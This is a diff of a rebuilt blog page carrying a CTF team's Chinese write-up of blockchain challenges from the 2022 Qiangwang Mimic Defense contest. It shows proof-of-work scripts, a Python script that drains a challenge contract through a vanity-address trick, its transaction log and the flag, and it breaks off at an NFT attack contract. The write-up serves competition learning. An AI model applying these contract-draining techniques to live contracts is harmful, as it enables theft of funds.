@@ -12,7 +12,7 @@
  
 
 
-      <title>第五届“强网”拟态防御国际精英挑战赛 SU Writeup - </title>
+      <title>第五届“强网”拟态防御国际精英挑战赛 SU Writeup - su-team</title>
 
   <meta name="description" content="感谢队里师傅们的辛苦付出,尤其是深海师傅@B1ue1nWh1te，考试中抽空第一个ak了区块链赛题！
 同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
@@ -67,7 +67,7 @@
   "headline": "第五届“强网”拟态防御国际精英挑战赛 SU Writeup",
   "description" : "感谢队里师傅们的辛苦付出,尤其是深海师傅@B1ue1nWh1te，考试中抽空第一个ak了区块链赛题！ 同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770) 以下是我们 SU 本次 强网拟态防御国际精英挑战赛 的 writeup\n",
   "inLanguage" : "en",
-  "wordCount":  4249 ,
+  "wordCount":  3297 ,
   "datePublished" : "2022-11-06T18:12:48\u002b08:00",
   "dateModified" : "2022-11-06T18:12:48\u002b08:00",
   "image" : "http:\/\/localhost:1313\/img\/SU.jpg",
@@ -107,55 +107,21 @@
   <link rel="alternate" href="http://localhost:1313/index.xml" type="application/rss+xml" title="su-team"><link rel="stylesheet" href="http://localhost:1313/css/katex.min.css" />
   <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/brands.min.css" />
   <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/fontawesome.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/regular.min.css" />
   <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/solid.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/svg.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/svg-with-js.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v4-font-face.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v4-shims.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v5-font-face.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/css/bootstrap.min.css" /><link rel="stylesheet" href="http://localhost:1313/css/main.css" /><link rel="stylesheet" href="http://localhost:1313/css/fonts.css" /><link rel="stylesheet" href="http://localhost:1313/css/syntax.css" /><link rel="stylesheet" href="http://localhost:1313/css/codeblock.css?v=20260212-fix3" /><link rel="stylesheet" href="http://localhost:1313/css/photoswipe.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/css/photoswipe.default-skin.min.css" /><style>
- 
-.navbar-custom .avatar-container {
-  width: 58px;
-  height: 58px;
-  margin-top: -29px;  
-  left: 50%;
-  transform: translateX(-50%);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: #fff;
-  border-radius: 50%;
-  box-shadow: 0 6px 18px rgba(0, 0, 0, 0.12);
-}
+  <link rel="stylesheet" href="http://localhost:1313/css/bootstrap.min.css" /><link rel="stylesheet" href="http://localhost:1313/css/main.css" /><link rel="stylesheet" href="http://localhost:1313/css/fonts.css" /><link rel="stylesheet" href="http://localhost:1313/css/syntax.css" /><link rel="stylesheet" href="http://localhost:1313/css/codeblock.css?v=20260322-1" /><link rel="stylesheet" href="http://localhost:1313/css/photoswipe.min.css" />
+  <link rel="stylesheet" href="http://localhost:1313/css/photoswipe.default-skin.min.css" /><script>
+  (function() {
+    var theme = "dark";
+    try {
+      theme = localStorage.getItem("theme") || "dark";
+    } catch (e) {
+      theme = "dark";
+    }
+    document.documentElement.setAttribute("data-theme", theme === "light" ? "light" : "dark");
+  })();
+</script>
+<link rel="stylesheet" href="/css/team-theme.css?v=20260322-6">
 
-.navbar-custom .avatar-container .avatar-img-border {
-  width: 100%;
-  height: 100%;
-  border-radius: 50%;
-  overflow: hidden;
-  margin: 0;
-  box-shadow: none;
-}
-
-.navbar-custom .avatar-container .avatar-img {
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-  border-radius: 50%;
-}
-
- 
-@media only screen and (min-width: 768px) {
-  .navbar-custom .avatar-container {
-    width: 72px;
-    height: 72px;
-    margin-top: -36px;  
-  }
-}
-</style>
   </head>
   <body>
     <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
@@ -167,12 +133,17 @@
         <span class="icon-bar"></span>
         <span class="icon-bar"></span>
       </button>
-      <a class="theme-toggle mobile-theme-toggle" href="javascript:void(0)" onclick="toggleTheme()" title="Toggle Theme">
-        <span class="sr-only">Toggle Theme</span>
-        <svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+
+      <a class="navbar-brand" href="/">
+        <span class="navbar-brand__title">su-team</span>
+        <span class="navbar-brand__meta">battle log</span>
+      </a>
+
+      <button type="button" class="theme-toggle mobile-theme-toggle hidden-sm hidden-md hidden-lg" onclick="toggleTheme()" aria-label="Toggle theme">
+        <svg class="theme-icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
           <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"></path>
         </svg>
-        <svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <svg class="theme-icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
           <circle cx="12" cy="12" r="5"></circle>
           <line x1="12" y1="1" x2="12" y2="3"></line>
           <line x1="12" y1="21" x2="12" y2="23"></line>
@@ -183,8 +154,7 @@
           <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
           <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
         </svg>
-      </a>
-      <a class="navbar-brand" href="http://localhost:1313/">su-team</a>
+      </button>
     </div>
 
     <div class="collapse navbar-collapse" id="main-navbar">
@@ -224,13 +194,12 @@
 
         
 
-        <li class="hidden-xs">
-          <a href="javascript:void(0)" class="theme-toggle" onclick="toggleTheme()" title="Toggle Theme">
-            <span class="sr-only">Toggle Theme</span>
-            <svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <li class="nav-theme-toggle hidden-xs">
+          <button type="button" class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle theme">
+            <svg class="theme-icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"></path>
             </svg>
-            <svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <svg class="theme-icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <circle cx="12" cy="12" r="5"></circle>
               <line x1="12" y1="1" x2="12" y2="3"></line>
               <line x1="12" y1="21" x2="12" y2="23"></line>
@@ -241,8 +210,9 @@
               <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
               <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
             </svg>
-          </a>
+          </button>
         </li>
+
         
       </ul>
     </div>
@@ -251,93 +221,20 @@
       
       
     
-
   </div>
 </nav>
+
 <script>
-  (function() {
-    const storedTheme = localStorage.getItem("theme");
-    const prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
-    if (storedTheme === "dark" || (!storedTheme && prefersDark)) {
-      document.body.classList.add("dark-mode");
-    } else {
-      document.body.classList.remove("dark-mode");
-    }
-  })();
   function toggleTheme() {
-    const body = document.body;
-    body.classList.toggle("dark-mode");
-    if (body.classList.contains("dark-mode")) {
-      localStorage.setItem("theme", "dark");
-    } else {
-      localStorage.setItem("theme", "light");
-    }
+    var root = document.documentElement;
+    var current = root.getAttribute("data-theme") === "light" ? "light" : "dark";
+    var next = current === "dark" ? "light" : "dark";
+    root.setAttribute("data-theme", next);
+    try {
+      localStorage.setItem("theme", next);
+    } catch (e) {}
   }
 </script>
-<style>
-  .theme-toggle {
-    cursor: pointer;
-    padding: 15px;
-    display: flex;
-    align-items: center;
-  }
-  .mobile-theme-toggle {
-    float: right;
-    padding: 15px 10px;
-    margin-top: 2px;
-  }
-  @media (min-width: 768px) {
-    .mobile-theme-toggle {
-      display: none !important;
-    }
-  }
-  .theme-icon-moon,
-  .theme-icon-sun {
-    color: #777;
-    transition: color .3s, transform .3s;
-  }
-  .theme-toggle:hover .theme-icon-moon,
-  .theme-toggle:hover .theme-icon-sun {
-    color: #333;
-  }
-  .theme-icon-sun {
-    display: none;
-  }
-  .theme-icon-moon {
-    display: block;
-  }
-  body.dark-mode .theme-icon-sun {
-    display: block;
-    color: #000;
-  }
-  body.dark-mode .theme-icon-moon {
-    display: none;
-  }
-  body.dark-mode {
-    filter: none !important;
-    background-color: #1a1a1a !important;
-  }
-  body.dark-mode header,
-  body.dark-mode .container,
-  body.dark-mode footer {
-    filter: invert(1) hue-rotate(180deg);
-  }
-  body.dark-mode .navbar-custom {
-    background-color: #1a1a1a !important;
-    border-bottom: 1px solid #333;
-  }
-  body.dark-mode .navbar-custom .container-fluid {
-    filter: invert(1) hue-rotate(180deg);
-  }
-  body.dark-mode img,
-  body.dark-mode video,
-  body.dark-mode iframe,
-  body.dark-mode .avatar-img,
-  body.dark-mode .navbar-custom .avatar-container {
-    filter: invert(1) hue-rotate(180deg);
-  }
-</style>
-
 
 
 
@@ -423,10 +320,10 @@
   <i class="fas fa-calendar"></i>&nbsp;Posted on November 6, 2022
   
   
-    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;20&nbsp;min
+    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;16&nbsp;min
   
   
-    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;4249&nbsp;words
+    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;3297&nbsp;words
   
   
     
@@ -448,14 +345,15 @@
 
 
     
-<div class="container" role="main">
-  
-  <div class="row flex-row">
-    <div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs">
-      <div class="toc-sidebar">
-        <h4 class="toc-title">#<br>TABLE OF CONTENTS</h4>
-        <div class="toc-card">
-          
+
+
+<div class="container post-layout" role="main">
+  <div class="row flex-row post-layout__row">
+    
+      <div class="col-lg-3 col-md-3 hidden-sm hidden-xs">
+        <aside class="toc-sidebar">
+          <h4 class="toc-title">Table of Contents</h4>
+          <div class="toc-card">
             <nav id="TableOfContents">
   <ul>
     <li><a href="#blockchain">BlockChain</a>
@@ -514,14 +412,15 @@
     </li>
   </ul>
 </nav>
-          
-        </div>
+          </div>
+        </aside>
       </div>
-    </div>
-    <div class="col-lg-9 col-md-9">
-  
-      <article role="main" class="blog-post">
-        <p>感谢队里师傅们的辛苦付出,尤其是深海师傅<code>@B1ue1nWh1te</code>，考试中抽空第一个ak了区块链赛题！
+      <div class="col-lg-9 col-md-9 post-layout__main">
+    
+
+        <section class="article-shell">
+          <article role="main" class="blog-post">
+            <p>感谢队里师傅们的辛苦付出,尤其是深海师傅<code>@B1ue1nWh1te</code>，考试中抽空第一个ak了区块链赛题！
 同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)
 以下是我们 SU 本次 强网拟态防御国际精英挑战赛 的 writeup</p>
 <h1 id="blockchain">BlockChain</h1>
@@ -534,21 +433,11 @@
 <h4 id="解题过程">解题过程</h4>
 <p>首先使用<code>nc 140.210.195.172 10001</code>连接服务器看看情况，发现需要先进行<code>工作量证明</code>，使用<code>Poseidon.PoW</code>模块即可，直接给出以下脚本<code>pow.py</code>。</p>
 <p><img src="https://img.seaeye.cn/img/qwnt2022/3.png" alt="3"></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Poseidon.PoW</span> <span class="kn">import</span> <span class="n">PoWUtils</span>   <span class="c1"># https://github.com/B1ue1nWh1te/Poseidon</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Poseidon.PoW</span> <span class="kn">import</span> <span class="n">PoWUtils</span>   <span class="c1"># https://github.com/B1ue1nWh1te/Poseidon</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">Connection</span> <span class="o">=</span> <span class="n">PoWUtils</span><span class="o">.</span><span class="n">ProofOfWork_SHA256_EndWithZero</span><span class="p">(</span><span class="s2">&#34;140.210.195.172&#34;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">,</span> <span class="s2">&#34;sha256(&#34;</span><span class="p">,</span> <span class="s2">&#34;+?)&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="s2">&#34;?=&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>执行<code>python3 pow.py</code>，成功进入题目环境。</p>
+</span></span></code></pre></div><p>执行<code>python3 pow.py</code>，成功进入题目环境。</p>
 <p><img src="https://img.seaeye.cn/img/qwnt2022/4.png" alt="4"></p>
 <p>进入<code>Option 4</code>，获取<code>合约源代码</code>（已附在题目描述中）。</p>
 <p>进入<code>Option 1</code>，创建<code>Deployer</code>账户。</p>
@@ -569,45 +458,7 @@
 <p>经过上述分析得到这一方程：<code>500-2x=64*2</code>，解得<code>x=186</code>，即十六进制的<code>0xba</code>，所以我们需要使用<a href="https://vanity-eth.tk/">虚荣地址生成器</a>来生成账户地址最后两位为<code>ba</code>的账户。使用这个账户来调用<code>_Cal</code>就可以实现每次合约的余额减少<code>186</code>，我们自己的余额增加<code>64</code>，两次后即可相等为<code>128</code>。</p>
 <p><img src="https://img.seaeye.cn/img/qwnt2022/12.png" alt="12"></p>
 <p>同样也给这个账户领取测试币用于发送链上交易，之后根据上述过程编写脚本进行攻击即可，使用<code>Poseidon.Blockchain</code>模块。代码中有详细注释。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Poseidon.Blockchain</span> <span class="kn">import</span> <span class="o">*</span>   <span class="c1"># https://github.com/B1ue1nWh1te/Poseidon</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Poseidon.Blockchain</span> <span class="kn">import</span> <span class="o">*</span>   <span class="c1"># https://github.com/B1ue1nWh1te/Poseidon</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 连接至链</span>
 </span></span><span class="line"><span class="cl"><span class="n">chain</span> <span class="o">=</span> <span class="n">Chain</span><span class="p">(</span><span class="s2">&#34;http://140.210.195.172:8545&#34;</span><span class="p">)</span>
@@ -641,130 +492,8 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 触发 ForFlag 事件</span>
 </span></span><span class="line"><span class="cl"><span class="n">contract</span><span class="o">.</span><span class="n">CallFunction</span><span class="p">(</span><span class="s2">&#34;getFlag&#34;</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>运行日志如下（这是写题解复现时的数据）：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">06</span> <span class="mi">00</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="mf">10.725</span> <span class="o">|</span> <span class="n">SUCCESS</span>  <span class="o">|</span> <span class="n">Poseidon</span><span class="o">.</span><span class="n">Blockchain</span><span class="p">:</span><span class="n">__init__</span><span class="p">:</span><span class="mi">32</span> <span class="o">-</span> 
+</span></span></code></pre></div><p>运行日志如下（这是写题解复现时的数据）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">06</span> <span class="mi">00</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="mf">10.725</span> <span class="o">|</span> <span class="n">SUCCESS</span>  <span class="o">|</span> <span class="n">Poseidon</span><span class="o">.</span><span class="n">Blockchain</span><span class="p">:</span><span class="n">__init__</span><span class="p">:</span><span class="mi">32</span> <span class="o">-</span> 
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Chain</span><span class="p">][</span><span class="n">Connect</span><span class="p">]</span><span class="n">Successfully</span> <span class="n">connected</span> <span class="n">to</span> <span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">140.210</span><span class="o">.</span><span class="mf">195.172</span><span class="p">:</span><span class="mi">8545</span><span class="p">]</span><span class="o">.</span> <span class="p">[</span><span class="n">Delay</span><span class="p">]</span> <span class="mi">141</span> <span class="n">ms</span>
 </span></span><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">06</span> <span class="mi">00</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="mf">10.749</span> <span class="o">|</span> <span class="n">SUCCESS</span>  <span class="o">|</span> <span class="n">Poseidon</span><span class="o">.</span><span class="n">Blockchain</span><span class="p">:</span><span class="n">__init__</span><span class="p">:</span><span class="mi">241</span> <span class="o">-</span> 
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Account</span><span class="p">][</span><span class="n">Import</span><span class="p">]</span><span class="n">Successfully</span> <span class="n">import</span> <span class="n">account</span> <span class="p">[</span><span class="mh">0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba</span><span class="p">]</span><span class="o">.</span>
@@ -880,19 +609,10 @@
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Value</span><span class="p">]</span><span class="mi">0</span> <span class="p">[</span><span class="n">GasUsed</span><span class="p">]</span><span class="mi">25193</span>
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Data</span><span class="p">]</span><span class="mh">0xf9633930</span>
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">Logs</span><span class="p">][</span><span class="n">AttributeDict</span><span class="p">({</span><span class="s1">&#39;address&#39;</span><span class="p">:</span> <span class="s1">&#39;0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02&#39;</span><span class="p">,</span> <span class="s1">&#39;topics&#39;</span><span class="p">:</span> <span class="p">[</span><span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x89814845d4f005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2&#39;</span><span class="p">)],</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;0x0000000000000000000000002f7ccf235768b35e0ba171d7fa60690ef35e79ba&#39;</span><span class="p">,</span> <span class="s1">&#39;blockNumber&#39;</span><span class="p">:</span> <span class="mi">92325</span><span class="p">,</span> <span class="s1">&#39;transactionHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0xc174fa072a9cd7464c2f1c79843621e8cfcf00f622f30bd4204dd653f30a3eba&#39;</span><span class="p">),</span> <span class="s1">&#39;transactionIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;blockHash&#39;</span><span class="p">:</span> <span class="n">HexBytes</span><span class="p">(</span><span class="s1">&#39;0x66036d09fbd50b766a6f03aae7cda0ac5f8f3c4d9b7fef1f7b02d138a127b28d&#39;</span><span class="p">),</span> <span class="s1">&#39;logIndex&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;removed&#39;</span><span class="p">:</span> <span class="n">False</span><span class="p">})]</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>最后进入<code>Option 3</code>，获取<code>flag</code>。</p>
+</span></span></code></pre></div><p>最后进入<code>Option 3</code>，获取<code>flag</code>。</p>
 <p><img src="https://img.seaeye.cn/img/qwnt2022/13.png" alt="13"></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{Make_Two_Equel_Successfully}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="nft-revenge">NFT Revenge</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{Make_Two_Equel_Successfully}
+</span></span></code></pre></div><h2 id="nft-revenge">NFT Revenge</h2>
 <h3 id="题目描述-1">题目描述</h3>
 <p><img src="https://img.seaeye.cn/img/qwnt2022/14.png" alt="14"></p>
 <p><img src="https://img.seaeye.cn/img/qwnt2022/15.png" alt="15"></p>
@@ -900,21 +620,11 @@
 <h3 id="解题过程-1">解题过程</h3>
 <p>首先使用<code>nc 140.210.217.225 10001</code>连接服务器看看情况，发现需要先进行<code>工作量证明</code>，使用<code>Poseidon.PoW</code>模块即可，直接给出以下脚本<code>pow.py</code>。</p>
 <p><img src="https://img.seaeye.cn/img/qwnt2022/16.png" alt="16"></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Poseidon.PoW</span> <span class="kn">import</span> <span class="n">PoWUtils</span>   <span class="c1"># https://github.com/B1ue1nWh1te/Poseidon</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Poseidon.PoW</span> <span class="kn">import</span> <span class="n">PoWUtils</span>   <span class="c1"># https://github.com/B1ue1nWh1te/Poseidon</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">Connection</span> <span class="o">=</span> <span class="n">PoWUtils</span><span class="o">.</span><span class="n">ProofOfWork_SHA256_EndWithZero</span><span class="p">(</span><span class="s2">&#34;140.210.217.225&#34;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">,</span> <span class="s2">&#34;sha256(&#34;</span><span class="p">,</span> <span class="s2">&#34;+?)&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="s2">&#34;?=&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>执行<code>python3 pow.py</code>，成功进入题目环境。</p>
+</span></span></code></pre></div><p>执行<code>python3 pow.py</code>，成功进入题目环境。</p>
 <p><img src="https://img.seaeye.cn/img/qwnt2022/17.png" alt="17"></p>
 <p>进入<code>Option 4</code>，获取<code>合约源代码</code>（已附在题目描述中）。</p>
 <p>进入<code>Option 1</code>，创建<code>Deployer</code>账户。</p>
@@ -962,144 +672,7 @@
 <p>根据上述分析，得到<code>Hack2</code>，第一次<code>Market.purchaseOrder(1)</code>后，<code>Market</code>的<code>orders</code>为<code>[#3,#1]</code>，所以再执行一次<code>Market.purchaseOrder(1)</code>买回<code>#1</code>NFT，至此我们已经拿到了全部NFT，调用<code>Market.win()</code>即可触发<code>SendFlag</code>事件。</p>
 <p><img src="https://img.seaeye.cn/img/qwnt2022/38.png" alt="38"></p>
 <p>下面给出完整的<code>Hacker.sol</code>攻击合约代码（这里的<code>target.sol</code>就是题目合约文件 上面分析已经很详细了 就不给注释了）：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
